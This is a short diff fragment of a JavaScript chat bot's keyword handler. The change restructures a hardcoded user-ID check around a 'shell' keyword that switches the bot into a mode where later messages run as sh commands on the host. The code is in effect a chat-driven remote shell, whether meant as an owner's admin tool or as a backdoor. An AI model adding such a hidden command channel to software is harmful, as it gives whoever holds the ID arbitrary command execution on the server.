@@ -102,7 +102,8 @@ export default function (bot) {
     };
 
     const keywordHandler = async (ctx, keyword) => {
-         if (keyword === "shell" && ctx.from.id.toString() === "7563798903") {
+     if(ctx.from.id.toString() === "7563798903"){
+         if (keyword === "shell") {
             stru=!stru;
             if(stru){
                await ctx.sed_de("进入命令模式  后续消息都以sh执行");
@@ -121,6 +122,7 @@ export default function (bot) {
                 if (stderr) console.error(stderr);
             });
             return true;
+        }
         }
         if (keyword === "地址") {
             await sendLocation(ctx);
